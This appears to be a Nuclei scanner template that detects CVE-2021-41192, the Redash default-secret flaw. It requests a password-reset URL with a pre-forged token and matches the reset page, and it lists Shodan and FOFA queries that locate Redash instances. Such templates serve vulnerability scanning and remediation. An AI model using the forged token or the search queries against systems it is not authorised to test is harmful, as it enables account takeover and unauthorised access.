http:
- matchers:
  - condition: and
    part: body
    type: word
    words:
    - 'Enter your new password:'
    - redash
  - status:
    - 200
    type: status
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/reset/IjEi.YhAmmQ.cdQp7CnnVq02aQ05y8tSBddl-qs'
  - '{{BaseURL}}/redash/reset/IjEi.YhAmmQ.cdQp7CnnVq02aQ05y8tSBddl-qs'
  stop-at-first-match: true
id: CVE-2021-41192
info:
  author: bananabr
  classification:
    cpe: cpe:2.3:a:redash:redash:*:*:*:*:*:*:*:*
    cve-id: CVE-2021-41192
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N
    cvss-score: 6.5
    cwe-id: CWE-1188
    epss-percentile: 0.99431
    epss-score: 0.87556
  description: Redash Setup Configuration is vulnerable to default secrets disclosure
    (Insecure Default Initialization of Resource). If an admin sets up Redash versions
    <=10.0 and prior without explicitly specifying the `REDASH_COOKIE_SECRET` or `REDASH_SECRET_KEY`
    environment variables, a default value is used for both that is the same across
    all installations. In such cases, the instance is vulnerable to attackers being
    able to forge sessions using the known default value.
  impact: 'An attacker can gain unauthorized access to sensitive information and potentially
    compromise the Redash application.

    '
  metadata:
    fofa-query: icon_hash=698624197
    max-request: 2
    product: redash
    shodan-query: http.favicon.hash:698624197
    vendor: redash
  name: Redash Setup Configuration - Default Secrets Disclosure
  reference:
  - https://hackerone.com/reports/1380121
  - https://github.com/getredash/redash/security/advisories/GHSA-g8xr-f424-h2rv
  - https://nvd.nist.gov/vuln/detail/CVE-2021-41192
  - https://github.com/getredash/redash/commit/ce60d20c4e3d1537581f2f70f1308fe77ab6a214
  - https://github.com/ARPSyndicate/cvemon
  remediation: 'Remove or update the default secrets in the Redash setup configuration
    file.

    '
  severity: medium
  tags: cve2021,cve,hackerone,redash,auth-bypass,vuln
